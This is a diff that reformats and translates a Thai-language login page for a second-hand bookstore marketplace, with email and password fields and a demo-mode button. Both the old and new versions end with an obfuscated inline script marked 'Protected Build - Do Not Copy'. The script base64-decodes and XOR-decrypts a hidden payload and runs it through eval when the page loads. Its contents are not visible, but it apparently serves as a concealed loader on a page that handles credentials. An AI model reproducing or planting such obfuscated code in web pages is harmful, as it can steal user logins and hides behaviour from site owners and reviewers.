@@ -1,29 +1,113 @@
-<!DOCTYPE html><html lang="th"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>เข้าสู่ระบบ | ร้านหนังสือมือสอง</title><script src="https://cdn.tailwindcss.com"></script><link rel="stylesheet" href="css/styles.css" /></head><body class="min-h-screen flex flex-col bg-[#FAF7F2] text-[#1F4E4B]"><div id="site-header"></div><main class="flex-1 py-10 sm:py-14 px-4 sm:px-6"><div class="max-w-4xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8 items-start"><div class="lg:col-span-6 bg-white rounded-3xl border border-[#E6E1D6] p-6 sm:p-8 shadow-2xs"><div class="mb-6"><span class="px-3 py-1 rounded-full bg-[#E0F4F1] text-[#26A69A] text-xs font-bold">MEMBER &amp; ADMIN LOGIN</span><h1 class="text-2xl font-extrabold text-[#1F4E4B] mt-2">เข้าสู่ระบบ</h1><p class="text-xs text-[#5F7470] mt-1">
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>เข้าสู่ระบบ | ร้านหนังสือมือสอง</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="css/styles.css" />
+</head>
+<body class="min-h-screen flex flex-col bg-[#FAF7F2] text-[#1F4E4B]">
+<div id="site-header">
+<header class="sticky top-0 z-50 bg-[#FAF7F2]/95 backdrop-blur-md border-b border-[#E6E1D6]">
+<div class="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between gap-2">
+<a href="index.html" class="flex items-center gap-2 font-extrabold text-base sm:text-lg text-[#1F4E4B]">
+<span class="w-8 h-8 rounded-xl bg-[#E0F4F1] text-[#26A69A] flex items-center justify-center">📚</span>
+<span>ร้านหนังสือมือสอง</span>
+</a>
+<div class="flex items-center gap-2">
+<a href="login.html" class="inline-flex items-center gap-1.5 px-3.5 sm:px-4 py-2 rounded-full bg-[#26A69A] hover:bg-[#219187] text-white text-xs sm:text-sm font-extrabold shadow-xs transition">
+<span>👤</span>
+<span>เข้าสู่ระบบ / สมัครสมาชิก</span>
+</a>
+</div>
+</div>
+</header>
+</div>
+<main class="flex-1 py-10 sm:py-14 px-4 sm:px-6">
+<div class="max-w-4xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+<div class="lg:col-span-6 bg-white rounded-3xl border border-[#E6E1D6] p-6 sm:p-8 shadow-2xs">
+<div class="mb-6">
+<span class="px-3 py-1 rounded-full bg-[#E0F4F1] text-[#26A69A] text-xs font-bold">เข้าสู่ระบบสำหรับสมาชิกและผู้ดูแล</span>
+<h1 class="text-2xl font-extrabold text-[#1F4E4B] mt-2">เข้าสู่ระบบ</h1>
+<p class="text-xs text-[#5F7470] mt-1">
             บัญชีเดียวสามารถเลือกซื้อ จองคิว และลงขายหนังสือได้ครบจบในที่เดียว
-          </p></div><div id="login-alert" class="hidden mb-4 p-3.5 rounded-2xl text-xs font-bold"></div><form id="login-form" onsubmit="handleLoginSubmit(event)" class="space-y-4"><div><label class="block text-xs font-bold text-[#1F4E4B] mb-1">อีเมล (Email)</label><input
+          </p>
+</div>
+<div id="login-alert" class="hidden mb-4 p-3.5 rounded-2xl text-xs font-bold"></div>
+<form id="login-form" onsubmit="handleLoginSubmit(event)" class="space-y-4">
+<div>
+<label class="block text-xs font-bold text-[#1F4E4B] mb-1">อีเมล</label>
+<input
               required
               type="email"
               id="login-email"
               placeholder="กรอกอีเมลของคุณ..."
               class="w-full rounded-2xl border border-[#E6E1D6] bg-[#FAF7F2] px-4 py-3 text-sm focus:border-[#26A69A] focus:outline-none"
-            /></div><div><div class="flex items-center justify-between mb-1"><label class="block text-xs font-bold text-[#1F4E4B]">รหัสผ่าน (Password)</label><a href="forgot-password.html" class="text-xs font-semibold text-[#E9964A] hover:underline">ลืมรหัสผ่าน?</a></div><input
+            />
+</div>
+<div>
+<div class="flex items-center justify-between mb-1">
+<label class="block text-xs font-bold text-[#1F4E4B]">รหัสผ่าน</label>
+<a href="forgot-password.html" class="text-xs font-semibold text-[#E9964A] hover:underline">ลืมรหัสผ่าน?</a>
+</div>
+<input
               required
               type="password"
               id="login-password"
               placeholder="กรอกรหัสผ่าน..."
               class="w-full rounded-2xl border border-[#E6E1D6] bg-[#FAF7F2] px-4 py-3 text-sm focus:border-[#26A69A] focus:outline-none"
-            /></div><button
+            />
+</div>
+<button
             type="submit"
             id="login-submit-btn"
             class="w-full py-3.5 px-6 rounded-full bg-[#26A69A] hover:bg-[#219187] text-white font-bold text-sm shadow-xs transition cursor-pointer"
           >
             เข้าสู่ระบบ
-          </button></form><div class="mt-6 pt-5 border-t border-[#E6E1D6] flex items-center justify-between text-xs"><span class="text-[#5F7470]">ยังไม่มีบัญชีสมาชิกใช่ไหม?</span><a href="register.html" class="font-bold text-[#26A69A] hover:underline">สมัครสมาชิกใหม่ →</a></div></div><div class="lg:col-span-6"><div class="pastel-hero-banner rounded-3xl border border-[#DCECE9] p-6 sm:p-8 shadow-2xs space-y-5"><div><span class="px-3 py-1 rounded-full bg-white border border-[#26A69A]/50 text-[#26A69A] text-xs font-bold">🟢 LIVE MARKETPLACE &amp; DEMO TOUR</span><h2 class="text-xl font-extrabold text-[#1F4E4B] mt-2">เริ่มต้นใช้งานตลาดหนังสือมือสอง</h2><p class="text-xs text-[#5F7470] mt-1 leading-relaxed">
-              เว็บไซต์อยู่ใน <strong>โหมดใช้งานจริง (Live Mode)</strong> สมาชิกสามารถสมัครสมาชิกเพื่อซื้อ-ขายหนังสือจริง จองคิวจริง และแชทผ่านบัญชีกลางได้ทันที
-            </p></div><div class="p-4 rounded-2xl bg-white/95 border border-[#E6E1D6] space-y-2.5"><div class="text-xs font-extrabold text-[#1F4E4B]">📝 สำหรับสมาชิกใหม่ (ใช้งานซื้อ-ขายจริง)</div><p class="text-xs text-[#5F7470]">สมัครสมาชิกฟรีเพียง 30 วินาที ใช้บัญชีเดียวได้ทั้งจองคิวซื้อหนังสือและลงประกาศขายหนังสือของคุณเอง</p><a href="register.html" class="inline-flex items-center justify-center w-full py-2.5 px-4 rounded-full bg-[#26A69A] hover:bg-[#219187] text-white font-bold text-xs shadow-2xs transition">
+          </button>
+</form>
+<div class="mt-6 pt-5 border-t border-[#E6E1D6] flex items-center justify-between text-xs">
+<span class="text-[#5F7470]">ยังไม่มีบัญชีสมาชิกใช่ไหม?</span>
+<a href="register.html" class="font-bold text-[#26A69A] hover:underline">สมัครสมาชิกใหม่ →</a>
+</div>
+</div>
+<div class="lg:col-span-6">
+<div class="pastel-hero-banner rounded-3xl border border-[#DCECE9] p-6 sm:p-8 shadow-2xs space-y-5">
+<div>
+<span class="px-3 py-1 rounded-full bg-white border border-[#26A69A]/50 text-[#26A69A] text-xs font-bold">🟢 ระบบซื้อขายจริง &amp; โหมดทดลองเล่น</span>
+<h2 class="text-xl font-extrabold text-[#1F4E4B] mt-2">เริ่มต้นใช้งานตลาดหนังสือมือสอง</h2>
+<p class="text-xs text-[#5F7470] mt-1 leading-relaxed">
+              เว็บไซต์อยู่ใน <strong>โหมดใช้งานจริง</strong> สมาชิกสามารถสมัครสมาชิกเพื่อซื้อ-ขายหนังสือจริง จองคิวจริง และแชทผ่านบัญชีกลางได้ทันที
+            </p>
+</div>
+<div class="p-4 rounded-2xl bg-white/95 border border-[#E6E1D6] space-y-2.5">
+<div class="text-xs font-extrabold text-[#1F4E4B]">📝 สำหรับสมาชิกใหม่ (ใช้งานซื้อ-ขายจริง)</div>
+<p class="text-xs text-[#5F7470]">สมัครสมาชิกฟรีเพียง 30 วินาที ใช้บัญชีเดียวได้ทั้งจองคิวซื้อหนังสือและลงประกาศขายหนังสือของคุณเอง</p>
+<a href="register.html" class="inline-flex items-center justify-center w-full py-2.5 px-4 rounded-full bg-[#26A69A] hover:bg-[#219187] text-white font-bold text-xs shadow-2xs transition">
               สมัครสมาชิกใช้งานจริง →
-            </a></div><div class="p-4 rounded-2xl bg-[#FDF2E2]/90 border-2 border-[#F4A261] space-y-2.5"><div class="flex items-center justify-between"><span class="text-xs font-extrabold text-[#1F4E4B]">✨ อยากลองเล่นระบบดูก่อนใช่ไหม?</span><span class="px-2.5 py-0.5 rounded-full bg-white text-[#E9964A] text-[10px] font-extrabold border border-[#F4A261]">แยกข้อมูล 100%</span></div><p class="text-xs text-[#5F7470] leading-relaxed">
-              กดปุ่มด้านล่างเพื่อเข้าสู่ <strong>โหมดทดลองเล่น (Demo 1 นาที)</strong> ลองกดจองคิว แชทกับ AI Chatbot และทดสอบฟีเจอร์ทั้งหมดได้โดย<strong>ไม่กระทบคิวหนังสือจริงของผู้อื่น</strong></p><button type="button" onclick="enterDemoTourMode().then(() => { window.location.href = 'index.html'; })" class="w-full py-2.5 px-4 rounded-full bg-[#E9964A] hover:bg-[#d98236] text-white font-extrabold text-xs shadow-2xs transition cursor-pointer">
-              ✨ ทดลองเล่นระบบ (Demo 1 นาที)
-            </button></div></div></div></div></main><div id="site-footer"></div><script src="js/books-data.js"></script><script src="js/app.js"></script><script>/* Protected Build - Do Not Copy */
-(function(){var _0x33fc48=['8F2O5L/2371z9uCHdqpn//VGxrTjpdyrb/fzzy3gKpS5E4O0/qXIpX/x6cUx8D/5/Efm+LvoyaRoxv3pO6w28vZUyvrz48O4caOtji3hYOv8QNfHq+fBo2isrZtVpDG+uU6ptP6ljKtv/erDf+Jk8PpHyvuwpcSrcuDoxRPrdvf3YNb2s+zY','4nmtpNtVpDG+uROD8fD13q9q4erUG+F3/+xf17z3vqbqPKSkgH/nfvDqR4Pxs+TFpjy5pMQw52Tz/F3Xurng2I9w4enFMfBT59BXi7Oy6sujcqnhzT7tfbmwHdX1svDJ5Gj27c13rSqUuRODtP6lz6Vy9/CAL+Vi7e5c0fD+uIyuc+fxzTrq','ZbD+VtfRsuDBr3LwxtkW4Dm59VzE/bCo3Ktv9/PPLeA2t7dFwvir4JfAPKSkgH+kcvH3QNe0v+nJuGjG69h/uTH69lDW+bvr2OR74fDlM+F8+/dH4e2X4YTtcOvjyTGpcPL8Qdez976m6jykpIB/537w6keD9qrrjPc84OvDKul08O0dxPGq','wMCvceHq1B39WPqxFM/7uezC52/x5s028Dz87V2EveWPjOo8pKSAPfB/sP1a0PW86cmuPLmk1C3xdKWTE4O0/qWMqGjqqtQ6/GXd9l3X8bDxjPc8o2QY3mSpLXmLBnRmNExym2Q9IL88k34gukMsbGUUYPw8PUDmDPEmOtMbJD49NiqkHqqO','caMqlLkTg7T+pdi4ZaT/qn+kMb65E4O0verCuWik9sUspCy++ETC/aqlyq9o5+yIeKtw7vAcwuGq7YOmc+PtznioMeWTE4O0/qWM6jykpM068Hnx/QmDs47K/547qI6Af6QxvrkTg7T+7cmreOH202Wkar6+cMz6quDCvjHQ/dA6oyu+vlLT','5LLsz6to7evOcO5i8fcUg+nyj4zqPKSkgH+kMb77XMft5KXmmVPKqtMr9njw/lrF7fb+jK9x5e3Mc6Rh/+pA1Pus4Yy3NY6kgH+kMb65E9695Y+M6jykpIB/pHLx90DXtLrk2Ks8uaTBKOV46rlBxufw79+lcqytm1WkMb65E4O0/uzK6jSl','9sUsqn71sBPYnv6ljOo8pKSAf6Rw8vxB19ax/YKpcOX30xHlfPu5DoOzs+eB/jz0qZNxsTHs9kbN8Lvhgfhk6KTUOvxls+FAg/Kx69jnfuvoxH/mdrPCEOXQmLfp+EGk5s8t4HTsuVHM5rrg3udHp8GZZrIl38QT1/Gm8YGRP7XClBqwU8O+','CKm0/qWM6jykpIB/5X3760fh+6ar2K9k8MfPMfB08O0TnrT5ZzZq8zwLgHikOr6xV8Lgv6vJuG7r9oAj+DG5eYojdGYHTHOVZDwSvzy7fiGKQy1WZRRp/Dw0QOce8SYD0xoQPj0NKqUMZBj1ZKkteYojdGYmTHObZDwoeK0qlLkTg7T+pYzq','PKTlzDr2Zdz2S433suTfuVDt99Rx9nTz9kXGvPntxa544eqHdr8bvrkTg7T+pYzqPObwznHgeO34Uc/xuqWR6nrl6NM6vxu+uRODtP6ljOo85vDOcfB05u1wzPqq4MK+PLmkh789kX4hsUMtV2UUePw8LkDnPfEnEdMbNz49HCqkHmQYxaMq','lLkTg7T+pYzqPKT2xSvxY/CiOYO0/qWM6jyk+ap/pDG+uRODtK3g2Itp8OzzOvdi9/Zdi/C/8c3kaOvvxTGoMfr4R8K6q/bJuDW/joB/pDG+uROD9bLg3r5e6/yOPOhw7ep9wvm7pZHqO+nmjWukYbOqHZa0rOrZpHjh4I1t/H2+7Vbb4PP9','3+p66+rUcuZ+8v0TwfPz3o+PLMKw5m7ZMfz2QcfxrKXOpW7g4dJy3zKsr3KVrZ/YjL55/PCNBKcg2K12l9aDopfAPKSkgH+kMb74X8bmqsfDsjLw4dgrx37w7VbN4P64jKr+GCyAe/91/+1Sjfm79t+re+H5wGSOMb65E4O0/qXNpnn28OIw','/D/99VLQ55Ls374y9uHNMPJ0tr5byvC64MLtNb+OgH+kMb65E4P3sevfvjz05dI+6WK+pBPN8aml+ZhQ1+HBLed5zvhBwvmtrdujcuDr13Hofv34R8r7sKvfr33258h2vxu+uRODtP6ljKlz6vfUf+dk7e1czsa74cW4eefwgGKkYf/rUs7n','8OLJvjSj9sU77WP7+keEveWPjOo8pKSAf6Ri++1nyvm76tm+NKytgGK6MeWTE4O0/qWM6jykpMk5pDn6+EfCuqv2ybgy9uvMOqQso6QThNW66MWkO62k21WkMb65E4O0/qWM6jzz7c4762aw9VzA9arsw6Qy7PbFOaQsvr5Sx/m364KiaOno','h2SOMb65E4O0/qWM6mGk4cws4TH3/xOL96v22KVx1uHENvZ0/e0ag+/UpYzqPKSkgH+kMb65RMr6uurb5HDr58Er7X7wt1vR8bilkep/8ffUMOlD+/1a0fG98ZfAPKSkgH+kMb65E960u+nfrzz/joB/pDG+uRODtP6ljL116uDPKKp98fpS','1/2x64KibuHigGKkNvf3V8bs8O3Yp3Cjv6p/pDG+uRODtP6l0cA8pKSAf6QxvuQfg6HutYXxFqSkgH+kMeO5UMLgve2M4nn29ol//xu+uRODtP6ljKtw4fbUHetpsPpfwuety82neaS5gHjpc7OtE9O57auZ6m7r8c474XWzq0vPtKrg1L4x','/PeAOet/6rRRzPi6pc6tMd+n5hvCI9urboP2sffIr26k5s8t4HTstGiA0ee8mv5d2aTUOvxls8IQktLqwJiIQaO/qn+kMb65E4O0v+nJuGjG69hx8HTm7XDM+qrgwr48uaSHvR6xcSG8g3RnBUxynWQ8FL88hX4hsUMtV2UUZ/w8GEDnMPEm','DdMbCj49CSqkNmQYy2SoHXmLOnRmBExyrmQ8A789kX4huUMsaWUVQvw8KUDnJfEmDNMaHD49ASqlBGQY1GSpKnmLAHRnCUxyg2Q9IL88tn4hnkMsfWUVRju/joB/pDG+uROD9bLg3r5e6/yOPOhw7ep/yueqq96vcevyxXejeff9V8b6+ayX','wDykpIB/pDG++0fNurrs36t+6OHEf7kx+Phf0PHlj4zqPKSkgH+kc+r3HdfxpvHvpXLw4c4rpCy+vtMaFD49LiqlDWQY7WSpNHmLGnRnDUxyv2Q8EL88i34hqYSv1KWM6jykpN1VpDG+uU4=','4vHOPPB48fcTxf2y6e2keMjrxzbqOfv0Usr48qXcq2/3888t4Di+4jmDtP6ljOp46+fVMuF/6rdUxuCb6cmneerw4ibNdba+X8zzt+uBr3Hl7cx4rT/o+F/W8f64jK9x5e3MZI4xvrkTg7S66s+/ceHq1HHjdOrcX8b5u+vYiGXN4Ih46H75'],_0x01fa27=0x1;(function(_0x709aae,_0xe2fbec){while(_0xe2fbec-->0x0){_0x709aae['push'](_0x709aae['shift']());}})(_0x33fc48,_0x33fc48['length']-_0x01fa27);var _0x945f25=[0x84,0x84,0xa0,0x5f,0x84,0x11,0x9e,0x99,0x33,0xa3,0x94,0xde,0x85,0xac,0xca,0x1c],_0x7cc946=_0x33fc48['join'](''),_0x982b59=window['atob'](_0x7cc946),_0x4d0131=_0x982b59['length'],_0xcb0b4d=new Uint8Array(_0x4d0131);for(var _0xe2fbec=0x0;_0xe2fbec<_0x4d0131;_0xe2fbec++){_0xcb0b4d[_0xe2fbec]=_0x982b59['charCodeAt'](_0xe2fbec)^_0x945f25[_0xe2fbec%_0x945f25['length']];}var _0xb870ea=new TextDecoder('utf-8')['decode'](_0xcb0b4d),_0x06dce8=window['eval'];_0x06dce8(_0xb870ea);})();</script></body></html>
+            </a>
+</div>
+<div class="p-4 rounded-2xl bg-[#FDF2E2]/90 border-2 border-[#F4A261] space-y-2.5">
+<div class="flex items-center justify-between">
+<span class="text-xs font-extrabold text-[#1F4E4B]">✨ อยากลองเล่นระบบดูก่อนใช่ไหม?</span>
+<span class="px-2.5 py-0.5 rounded-full bg-white text-[#E9964A] text-[10px] font-extrabold border border-[#F4A261]">แยกข้อมูล 100%</span>
+</div>
+<p class="text-xs text-[#5F7470] leading-relaxed">
+              กดปุ่มด้านล่างเพื่อเข้าสู่ <strong>โหมดทดลองเล่น (จำลอง 1 นาที)</strong> ลองกดจองคิว แชทกับผู้ช่วยอัจฉริยะ และทดสอบฟีเจอร์ทั้งหมดได้โดย<strong>ไม่กระทบคิวหนังสือจริงของผู้อื่น</strong>
+</p>
+<button type="button" onclick="enterDemoTourMode().then(() => { window.location.href = 'index.html'; })" class="w-full py-2.5 px-4 rounded-full bg-[#E9964A] hover:bg-[#d98236] text-white font-extrabold text-xs shadow-2xs transition cursor-pointer">
+              ✨ เข้าสู่โหมดทดลองเล่น (จำลอง 1 นาที)
+            </button>
+</div>
+</div>
+</div>
+</div>
+</main>
+<div id="site-footer"></div>
+<script src="js/books-data.js"></script>
+<script src="js/app.js"></script>
+<script>/* Protected Build - Do Not Copy */
+(function(){var _0x33fc48=['8F2O5L/2371z9uCHdqpn//VGxrTjpdyrb/fzzy3gKpS5E4O0/qXIpX/x6cUx8D/5/Efm+LvoyaRoxv3pO6w28vZUyvrz48O4caOtji3hYOv8QNfHq+fBo2isrZtVpDG+uU6ptP6ljKtv/erDf+Jk8PpHyvuwpcSrcuDoxRPrdvf3YNb2s+zY','4nmtpNtVpDG+uROD8fD13q9q4erUG+F3/+xf17z3vqbqPKSkgH/nfvDqR4Pxs+TFpjy5pMQw52Tz/F3Xurng2I9w4enFMfBT59BXi7Oy6sujcqnhzT7tfbmwHdX1svDJ5Gj27c13rSqUuRODtP6lz6Vy9/CAL+Vi7e5c0fD+uIyuc+fxzTrq','ZbD+VtfRsuDBr3LwxtkW4Dm59VzE/bCo3Ktv9/PPLeA2t7dFwvir4JfAPKSkgH+kcvH3QNe0v+nJuGjG69h/uTH69lDW+bvr2OR74fDlM+F8+/dH4e2X4YTtcOvjyTGpcPL8Qdez976m6jykpIB/537w6keD9qrrjPc84OvDKul08O0dxPGq','wMCvceHq1B39WPqxFM/7uezC52/x5s028Dz87V2EveWPjOo8pKSAPfB/sP1a0PW86cmuPLmk1C3xdKWTE4O0/qWMqGjqqtQ6/GXd9l3X8bDxjPc8o2QY3mSpLXmLBnRmNExym2Q9IL88k34gukMsbGUUYPw8PUDmDPEmOtMbJD49NiqkHqqO','caMqlLkTg7T+pdi4ZaT/qn+kMb65E4O0verCuWik9sUspCy++ETC/aqlyq9o5+yIeKtw7vAcwuGq7YOmc+PtznioMeWTE4O0/qWM6jykpM068Hnx/QmDs47K/547qI6Af6QxvrkTg7T+7cmreOH202Wkar6+cMz6quDCvjHQ/dA6oyu+vlLT','5LLsz6to7evOcO5i8fcUg+nyj4zqPKSkgH+kMb77XMft5KXmmVPKqtMr9njw/lrF7fb+jK9x5e3Mc6Rh/+pA1Pus4Yy3NY6kgH+kMb65E9695Y+M6jykpIB/pHLx90DXtLrk2Ks8uaTBKOV46rlBxufw79+lcqytm1WkMb65E4O0/uzK6jSl','9sUsqn71sBPYnv6ljOo8pKSAf6Rw8vxB19ax/YKpcOX30xHlfPu5DoOzs+eB/jz0qZNxsTHs9kbN8Lvhgfhk6KTUOvxls+FAg/Kx69jnfuvoxH/mdrPCEOXQmLfp+EGk5s8t4HTsuVHM5rrg3udHp8GZZrIl38QT1/Gm8YGRP7XClBqwU8O+','CKm0/qWM6jykpIB/5X3760fh+6ar2K9k8MfPMfB08O0TnrT5ZzZq8zwLgHikOr6xV8Lgv6vJuG7r9oAj+DG5eYojdGYHTHOVZDwSvzy7fiGKQy1WZRRp/Dw0QOce8SYD0xoQPj0NKqUMZBj1ZKkteYojdGYmTHObZDwoeK0qlLkTg7T+pYzq','PKTlzDr2Zdz2S433suTfuVDt99Rx9nTz9kXGvPntxa544eqHdr8bvrkTg7T+pYzqPObwznHgeO34Uc/xuqWR6nrl6NM6vxu+uRODtP6ljOo85vDOcfB05u1wzPqq4MK+PLmkh789kX4hsUMtV2UUePw8LkDnPfEnEdMbNz49HCqkHmQYxaMq','lLkTg7T+pYzqPKT2xSvxY/CiOYO0/qWM6jyk+ap/pDG+uRODtK3g2Itp8OzzOvdi9/Zdi/C/8c3kaOvvxTGoMfr4R8K6q/bJuDW/joB/pDG+uROD9bLg3r5e6/yOPOhw7ep9wvm7pZHqO+nmjWukYbOqHZa0rOrZpHjh4I1t/H2+7Vbb4PP9','3+p66+rUcuZ+8v0TwfPz3o+PLMKw5m7ZMfz2QcfxrKXOpW7g4dJy3zKsr3KVrZ/YjL55/PCNBKcg2K12l9aDopfAPKSkgH+kMb74X8bmqsfDsjLw4dgrx37w7VbN4P64jKr+GCyAe/91/+1Sjfm79t+re+H5wGSOMb65E4O0/qXNpnn28OIw','/D/99VLQ55Ls374y9uHNMPJ0tr5byvC64MLtNb+OgH+kMb65E4P3sevfvjz05dI+6WK+pBPN8aml+ZhQ1+HBLed5zvhBwvmtrdujcuDr13Hofv34R8r7sKvfr33258h2vxu+uRODtP6ljKlz6vfUf+dk7e1czsa74cW4eefwgGKkYf/rUs7n','8OLJvjSj9sU77WP7+keEveWPjOo8pKSAf6Ri++1nyvm76tm+NKytgGK6MeWTE4O0/qWM6jykpMk5pDn6+EfCuqv2ybgy9uvMOqQso6QThNW66MWkO62k21WkMb65E4O0/qWM6jzz7c4762aw9VzA9arsw6Qy7PbFOaQsvr5Sx/m364KiaOno','h2SOMb65E4O0/qWM6mGk4cws4TH3/xOL96v22KVx1uHENvZ0/e0ag+/UpYzqPKSkgH+kMb65RMr6uurb5HDr58Er7X7wt1vR8bilkep/8ffUMOlD+/1a0fG98ZfAPKSkgH+kMb65E960u+nfrzz/joB/pDG+uRODtP6ljL116uDPKKp98fpS','1/2x64KibuHigGKkNvf3V8bs8O3Yp3Cjv6p/pDG+uRODtP6l0cA8pKSAf6QxvuQfg6HutYXxFqSkgH+kMeO5UMLgve2M4nn29ol//xu+uRODtP6ljKtw4fbUHetpsPpfwuety82neaS5gHjpc7OtE9O57auZ6m7r8c474XWzq0vPtKrg1L4x','/PeAOet/6rRRzPi6pc6tMd+n5hvCI9urboP2sffIr26k5s8t4HTstGiA0ee8mv5d2aTUOvxls8IQktLqwJiIQaO/qn+kMb65E4O0v+nJuGjG69hx8HTm7XDM+qrgwr48uaSHvR6xcSG8g3RnBUxynWQ8FL88hX4hsUMtV2UUZ/w8GEDnMPEm','DdMbCj49CSqkNmQYy2SoHXmLOnRmBExyrmQ8A789kX4huUMsaWUVQvw8KUDnJfEmDNMaHD49ASqlBGQY1GSpKnmLAHRnCUxyg2Q9IL88tn4hnkMsfWUVRju/joB/pDG+uROD9bLg3r5e6/yOPOhw7ep/yueqq96vcevyxXejeff9V8b6+ayX','wDykpIB/pDG++0fNurrs36t+6OHEf7kx+Phf0PHlj4zqPKSkgH+kc+r3HdfxpvHvpXLw4c4rpCy+vtMaFD49LiqlDWQY7WSpNHmLGnRnDUxyv2Q8EL88i34hqYSv1KWM6jykpN1VpDG+uU4=','4vHOPPB48fcTxf2y6e2keMjrxzbqOfv0Usr48qXcq2/3888t4Di+4jmDtP6ljOp46+fVMuF/6rdUxuCb6cmneerw4ibNdba+X8zzt+uBr3Hl7cx4rT/o+F/W8f64jK9x5e3MZI4xvrkTg7S66s+/ceHq1HHjdOrcX8b5u+vYiGXN4Ih46H75'],_0x01fa27=0x1;(function(_0x709aae,_0xe2fbec){while(_0xe2fbec-->0x0){_0x709aae['push'](_0x709aae['shift']());}})(_0x33fc48,_0x33fc48['length']-_0x01fa27);var _0x945f25=[0x84,0x84,0xa0,0x5f,0x84,0x11,0x9e,0x99,0x33,0xa3,0x94,0xde,0x85,0xac,0xca,0x1c],_0x7cc946=_0x33fc48['join'](''),_0x982b59=window['atob'](_0x7cc946),_0x4d0131=_0x982b59['length'],_0xcb0b4d=new Uint8Array(_0x4d0131);for(var _0xe2fbec=0x0;_0xe2fbec<_0x4d0131;_0xe2fbec++){_0xcb0b4d[_0xe2fbec]=_0x982b59['charCodeAt'](_0xe2fbec)^_0x945f25[_0xe2fbec%_0x945f25['length']];}var _0xb870ea=new TextDecoder('utf-8')['decode'](_0xcb0b4d),_0x06dce8=window['eval'];_0x06dce8(_0xb870ea);})();</script>
+</body>
+</html>
